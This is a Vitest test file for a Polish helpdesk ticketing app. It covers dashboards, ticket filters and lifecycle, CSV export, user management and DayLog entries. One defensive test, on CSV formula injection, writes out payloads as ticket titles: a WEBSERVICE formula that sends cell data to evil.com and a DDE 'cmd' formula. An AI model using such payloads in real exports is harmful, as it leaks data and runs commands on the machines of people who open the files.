import { describe, expect, it, vi, beforeEach, afterEach } from "vitest";
import { unlink } from "node:fs/promises";
import path from "node:path";

// Mock server-only and next/cache for vitest environment
vi.mock("server-only", () => ({}));
vi.mock("next/cache", () => ({
  unstable_noStore: () => {}
}));

const dataFile = path.join(process.cwd(), ".data", "fixit-db.json");

async function resetDatabase() {
  try {
    await unlink(dataFile);
  } catch {
    // File doesn't exist yet - that's fine
  }
}

describe("getStoreDashboard", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("returns zero metrics for store with no tickets", async () => {
    const { getStoreDashboard } = await import("@/lib/data-store");

    const dashboard = await getStoreDashboard("store_waw01");

    expect(dashboard.openTickets).toBe(0);
    expect(dashboard.criticalTickets).toBe(0);
    expect(dashboard.blockingTickets).toBe(0);
    expect(dashboard.resolvedToday).toBe(0);
    expect(dashboard.recentEvents).toHaveLength(0);
  });

  it("returns zero metrics for store_krk02 (no tickets)", async () => {
    const { getStoreDashboard } = await import("@/lib/data-store");

    const dashboard = await getStoreDashboard("store_krk02");

    expect(dashboard.openTickets).toBe(0);
    expect(dashboard.criticalTickets).toBe(0);
    expect(dashboard.blockingTickets).toBe(0);
    expect(dashboard.resolvedToday).toBe(0);
    expect(dashboard.recentEvents).toHaveLength(0);
  });

  it("returns empty events list when no tickets exist", async () => {
    const { getStoreDashboard } = await import("@/lib/data-store");

    const dashboard = await getStoreDashboard("store_waw01");

    expect(dashboard.recentEvents).toHaveLength(0);
  });
});

describe("getDashboardMetrics", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("returns zero metrics from seed data (no tickets yet)", async () => {
    const { getDashboardMetrics } = await import("@/lib/data-store");

    const metrics = await getDashboardMetrics();

    expect(metrics.totalTickets).toBe(0);
    expect(metrics.openTickets).toBe(0);
    expect(metrics.criticalTickets).toBe(0);
    expect(metrics.avgResolutionHours).toBeNull();
  });

  it("returns empty top categories when no tickets exist", async () => {
    const { getDashboardMetrics } = await import("@/lib/data-store");

    const metrics = await getDashboardMetrics();

    expect(metrics.topCategories).toHaveLength(0);
  });

  it("returns empty SLA breaches when no tickets exist", async () => {
    const { getDashboardMetrics } = await import("@/lib/data-store");

    const metrics = await getDashboardMetrics();

    expect(metrics.slaBreached).toHaveLength(0);
  });
});

describe("listVisibleTickets filters", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("applies search, status and priority filters in the JSON data provider", async () => {
    const { createTicket, findUserByEmail, listVisibleTickets } = await import("@/lib/data-store");
    const admin = await findUserByEmail("krzysztofgraczyk@bagietka.pl");

    expect(admin).toBeDefined();

    await createTicket({
      title: "Drukarka fiskalna nie działa",
      description: "Stanowisko 2 nie drukuje paragonów.",
      blocksWork: false,
      contact: "sklep@bagietka.pl",
      categoryId: "cat_printer",
      reporterId: admin!.id,
      priority: "HIGH"
    });

    await createTicket({
      title: "Internet działa wolno",
      description: "Problem z siecią w biurze.",
      blocksWork: false,
      contact: "biuro@bagietka.pl",
      categoryId: "cat_network",
      reporterId: admin!.id,
      priority: "NORMAL"
    });

    const results = await listVisibleTickets(admin!, {
      query: "drukarka",
      status: "NEW",
      priority: "HIGH"
    });

    expect(results).toHaveLength(1);
    expect(results[0]?.title).toBe("Drukarka fiskalna nie działa");
  });
});

describe("ticket lifecycle timestamps", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("clears stale resolution and closure timestamps when a ticket is reopened", async () => {
    const { createTicket, findUserByEmail, updateTicket } = await import("@/lib/data-store");
    const admin = await findUserByEmail("krzysztofgraczyk@bagietka.pl");

    expect(admin).toBeDefined();

    const ticket = await createTicket({
      title: "Test cyklu życia",
      description: "Sprawdzenie znaczników czasu statusu.",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: admin!.id,
      priority: "NORMAL"
    });

    const resolved = await updateTicket({
      ticketId: ticket.id,
      actorId: admin!.id,
      status: "RESOLVED",
      priority: ticket.priority
    });
    expect(resolved?.resolvedAt).toBeDefined();

    const reopened = await updateTicket({
      ticketId: ticket.id,
      actorId: admin!.id,
      status: "IN_PROGRESS",
      priority: ticket.priority
    });
    expect(reopened?.resolvedAt).toBeNull();

    const closed = await updateTicket({
      ticketId: ticket.id,
      actorId: admin!.id,
      status: "CLOSED",
      priority: ticket.priority
    });
    expect(closed?.closedAt).toBeDefined();

    const reopenedAgain = await updateTicket({
      ticketId: ticket.id,
      actorId: admin!.id,
      status: "IN_PROGRESS",
      priority: ticket.priority
    });
    expect(reopenedAgain?.closedAt).toBeNull();
  });
});

describe("exportTicketsCSV", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("returns CSV with header row only when no tickets exist", async () => {
    const { exportTicketsCSV } = await import("@/lib/data-store");

    const csv = await exportTicketsCSV();

    const lines = csv.trim().split("\n");
    expect(lines.length).toBe(1); // header only

    // Header should contain expected columns
    expect(lines[0]).toContain("Numer");
    expect(lines[0]).toContain("Tytul");
    expect(lines[0]).toContain("Status");
    expect(lines[0]).toContain("Priorytet");
  });
});

describe("CSV injection prevention", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("neutralizes formula injection in ticket titles via export", async () => {
    const { createTicket, exportTicketsCSV } = await import("@/lib/data-store");

    // Create tickets with formula-like titles
    await createTicket({
      title: "=WEBSERVICE(\"https://evil.com/\"&A1)",
      description: "Test formula injection",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    await createTicket({
      title: "+SUM(1,1)",
      description: "Plus formula",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    await createTicket({
      title: "-DDE(\"cmd\")",
      description: "Minus formula",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    await createTicket({
      title: "@SUM(1,1)",
      description: "At formula",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    // Safe title should not be affected
    await createTicket({
      title: "Normal title with no injection",
      description: "Safe",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    const csv = await exportTicketsCSV();

    // Formula values should be neutralized (prepended with single quote prefix)
    // The single quote prevents spreadsheet software from executing formulas
    expect(csv).toContain("'=WEBSERVICE");
    expect(csv).toContain("'+SUM");
    expect(csv).toContain("'-DDE");
    expect(csv).toContain("'@SUM");

    // Safe values should remain unchanged
    expect(csv).toContain("Normal title with no injection");
  });
});

describe("user creation", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("creates a new user and allows lookup by active email", async () => {
    const { createUser, findUserByEmail } = await import("@/lib/data-store");

    const user = await createUser({
      name: "Jan Kowalski",
      email: "jan.kowalski@bagietka.pl",
      role: "REPORTER",
      isActive: true,
      passwordHash: "salt:hash",
      mustChangePassword: false
    });

    expect(user.email).toBe("jan.kowalski@bagietka.pl");
    expect(user.role).toBe("REPORTER");

    const found = await findUserByEmail("jan.kowalski@bagietka.pl");
    expect(found?.id).toBe(user.id);
  });

  it("does not return inactive users from standard email lookup", async () => {
    const { createUser, findUserByEmail } = await import("@/lib/data-store");

    await createUser({
      name: "Jan Kowalski",
      email: "jan.kowalski@bagietka.pl",
      role: "REPORTER",
      isActive: false,
      passwordHash: "salt:hash",
      mustChangePassword: false
    });

    expect(await findUserByEmail("jan.kowalski@bagietka.pl")).toBeUndefined();
    expect(await findUserByEmail("jan.kowalski@bagietka.pl", { includeInactive: true })).toBeDefined();
  });

  it("adds an admin audit log when user is created by admin", async () => {
    const { createUser, listAdminAuditLogs } = await import("@/lib/data-store");

    const user = await createUser({
      name: "Jan Kowalski",
      email: "jan.kowalski@bagietka.pl",
      role: "REPORTER",
      isActive: true,
      passwordHash: "salt:hash",
      mustChangePassword: true,
      actorId: "usr_admin"
    });

    const logs = await listAdminAuditLogs(5);
    expect(logs[0]?.action).toBe("USER_CREATED");
    expect(logs[0]?.entityId).toBe(user.id);
  });

  it("deletes a user without historical records and writes an audit log", async () => {
    const { createUser, deleteUserAdmin, findUserByEmail, listAdminAuditLogs } = await import("@/lib/data-store");

    const user = await createUser({
      name: "Jan Kowalski",
      email: "jan.kowalski@bagietka.pl",
      role: "REPORTER",
      isActive: true,
      passwordHash: "salt:hash",
      mustChangePassword: true,
      actorId: "usr_admin"
    });

    await expect(deleteUserAdmin({ userId: user.id, actorId: "usr_admin" })).resolves.toBe(true);

    expect(await findUserByEmail("jan.kowalski@bagietka.pl", { includeInactive: true })).toBeUndefined();
    const logs = await listAdminAuditLogs(5);
    expect(logs[0]?.action).toBe("USER_DELETED");
    expect(logs[0]?.entityId).toBe(user.id);
  });

  it("blocks deleting a user with reported tickets", async () => {
    const { createTicket, createUser, deleteUserAdmin } = await import("@/lib/data-store");

    const user = await createUser({
      name: "Jan Kowalski",
      email: "jan.kowalski@bagietka.pl",
      role: "REPORTER",
      isActive: true,
      passwordHash: "salt:hash",
      mustChangePassword: false
    });

    await createTicket({
      title: "Test",
      description: "Ticket created by reporter",
      blocksWork: false,
      contact: user.email,
      categoryId: "cat_other",
      reporterId: user.id,
      priority: "NORMAL"
    });

    await expect(deleteUserAdmin({ userId: user.id, actorId: "usr_admin" })).rejects.toThrow(
      "Dezaktywuj konto zamiast usuwać"
    );
  });
});

describe("listVisibleTicketsPage pagination", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("returns stable cursor pages without loading the full result set into the caller", async () => {
    const { createTicket, findUserByEmail, listVisibleTicketsPage } = await import("@/lib/data-store");
    const admin = await findUserByEmail("krzysztofgraczyk@bagietka.pl");

    expect(admin).toBeDefined();

    for (let index = 0; index < 3; index += 1) {
      await createTicket({
        title: `Testowe zgłoszenie ${index}`,
        description: "Opis testowego zgłoszenia.",
        blocksWork: false,
        contact: "test@bagietka.pl",
        categoryId: "cat_other",
        reporterId: admin!.id,
        priority: "NORMAL"
      });
    }

    const firstPage = await listVisibleTicketsPage(admin!, {}, { limit: 2 });
    expect(firstPage.tickets).toHaveLength(2);
    expect(firstPage.hasMore).toBe(true);
    expect(firstPage.nextCursor).toBeDefined();

    const secondPage = await listVisibleTicketsPage(admin!, {}, {
      limit: 2,
      cursor: firstPage.nextCursor
    });
    expect(secondPage.tickets).toHaveLength(1);
    expect(secondPage.hasMore).toBe(false);
    expect(new Set(firstPage.tickets.map((ticket) => ticket.id))).not.toContain(secondPage.tickets[0]?.id);
  });
});

describe("DayLog storage", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("creates entries with author details and lists the newest occurrence first", async () => {
    const { createDayLogEntry, listDayLogEntries } = await import("@/lib/data-store");

    const older = await createDayLogEntry({
      occurredAt: "2026-08-04T08:00:00.000Z",
      fromName: "Sklep Warszawa",
      subject: "Problem z kasą",
      description: "Kasa nie drukuje paragonów.",
      createdById: "usr_admin"
    });
    const newer = await createDayLogEntry({
      occurredAt: "2026-08-04T10:30:00.000Z",
      fromName: "Sklep Kraków",
      subject: "Brak internetu",
      description: "Połączenie zostało przywrócone po restarcie routera.",
      createdById: "usr_admin"
    });

    expect(older.createdByName).toBe("Krzysztof Graczyk");
    expect(older.createdByEmail).toBe("krzysztofgraczyk@bagietka.pl");
    expect(older.createdAt).toBe(older.updatedAt);

    const entries = await listDayLogEntries();
    expect(entries.map((entry) => entry.id)).toEqual([newer.id, older.id]);
    expect(entries[0]).toMatchObject({
      fromName: "Sklep Kraków",
      createdByName: "Krzysztof Graczyk",
      createdByEmail: "krzysztofgraczyk@bagietka.pl"
    });
  });

  it("returns an empty list for a newly seeded database", async () => {
    const { listDayLogEntries } = await import("@/lib/data-store");

    await expect(listDayLogEntries()).resolves.toEqual([]);
  });

  it("updates and deletes an existing DayLog entry", async () => {
    const { createDayLogEntry, deleteDayLogEntry, listDayLogEntries, updateDayLogEntry } = await import("@/lib/data-store");
    const entry = await createDayLogEntry({
      occurredAt: "2026-08-04T10:30:00.000Z",
      fromName: "Sklep Warszawa",
      subject: "Awaria kasy",
      description: "Kasa nie drukuje paragonów.",
      createdById: "usr_admin"
    });

    const updated = await updateDayLogEntry({
      id: entry.id,
      occurredAt: "2026-08-04T11:30:00.000Z",
      fromName: "Sklep Kraków",
      subject: "Brak internetu",
      description: "Połączenie przywrócone."
    });

    expect(updated).toMatchObject({
      id: entry.id,
      fromName: "Sklep Kraków",
      subject: "Brak internetu",
      description: "Połączenie przywrócone.",
      occurredAt: "2026-08-04T11:30:00.000Z"
    });
    expect(updated?.updatedAt).not.toBe(entry.updatedAt);
    await expect(deleteDayLogEntry(entry.id)).resolves.toBe(true);
    await expect(listDayLogEntries()).resolves.toEqual([]);
    await expect(deleteDayLogEntry(entry.id)).resolves.toBe(false);
  });

  it("blocks deletion of a user who authored a DayLog entry", async () => {
    const { createDayLogEntry, createUser, deleteUserAdmin } = await import("@/lib/data-store");
    const author = await createUser({
      name: "Technik DayLog",
      email: "daylog.technik@bagietka.pl",
      role: "AGENT",
      isActive: true,
      passwordHash: "salt:hash",
      mustChangePassword: false
    });

    await createDayLogEntry({
      occurredAt: "2026-08-04T10:30:00.000Z",
      fromName: "Sklep Kraków",
      subject: "Brak internetu",
      description: "Telefoniczne zgłoszenie awarii.",
      createdById: author.id
    });

    await expect(deleteUserAdmin({ userId: author.id, actorId: "usr_admin" })).rejects.toThrow("wpisy DayLog");
  });
});

describe("ticket submission idempotency", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("returns the same ticket for concurrent submissions with one submission id", async () => {
    const { createTicketWithResult, readDatabase } = await import("@/lib/data-store");
    const input = {
      title: "Drukarka nie działa",
      description: "Drukarka na stanowisku 2 nie drukuje paragonów.",
      blocksWork: false,
      contact: "sklep@bagietka.pl",
      categoryId: "cat_printer",
      reporterId: "usr_admin",
      priority: "HIGH" as const,
      submissionId: "4f6d9e62-c7e5-4c9b-a0a8-8c6c1e72a5e1"
    };

    const [first, second] = await Promise.all([createTicketWithResult(input), createTicketWithResult(input)]);
    const database = await readDatabase();
    const matchingTickets = database.tickets.filter((ticket) => ticket.submissionId === input.submissionId);

    expect(first.ticket.id).toBe(second.ticket.id);
    expect([first.created, second.created].sort()).toEqual([false, true]);
    expect(matchingTickets).toHaveLength(1);
    expect(database.events.filter((event) => event.ticketId === first.ticket.id)).toHaveLength(1);
    expect(database.notificationLogs.filter((log) => log.ticketId === first.ticket.id)).toHaveLength(1);
  });

  it("links one DayLog entry to exactly one ticket", async () => {
    const { createDayLogEntry, createTicketWithResult, findDayLogEntry, readDatabase } = await import("@/lib/data-store");
    const entry = await createDayLogEntry({
      occurredAt: "2026-08-10T08:30:00.000Z",
      fromName: "Sklep Warszawa",
      subject: "Awaria drukarki",
      description: "Drukarka nie drukuje etykiet od rana.",
      createdById: "usr_admin"
    });
    const input = {
      title: entry.subject,
      description: entry.description,
      blocksWork: false,
      contact: entry.fromName,
      categoryId: "cat_printer",
      reporterId: "usr_admin",
      priority: "NORMAL" as const,
      dayLogEntryId: entry.id
    };

    const first = await createTicketWithResult({
      ...input,
      submissionId: "4f6d9e62-c7e5-4c9b-a0a8-8c6c1e72a5e2"
    });
    const second = await createTicketWithResult({
      ...input,
      submissionId: "4f6d9e62-c7e5-4c9b-a0a8-8c6c1e72a5e3"
    });
    const linkedEntry = await findDayLogEntry(entry.id);
    const database = await readDatabase();

    expect(first.created).toBe(true);
    expect(second).toEqual({ ticket: first.ticket, created: false });
    expect(linkedEntry).toMatchObject({ ticketId: first.ticket.id, ticketNumber: first.ticket.number });
    expect(database.tickets.filter((ticket) => ticket.id === first.ticket.id)).toHaveLength(1);
    expect(database.events.find((event) => event.ticketId === first.ticket.id)?.payload).toEqual({
      dayLogEntryId: entry.id
    });
  });
});
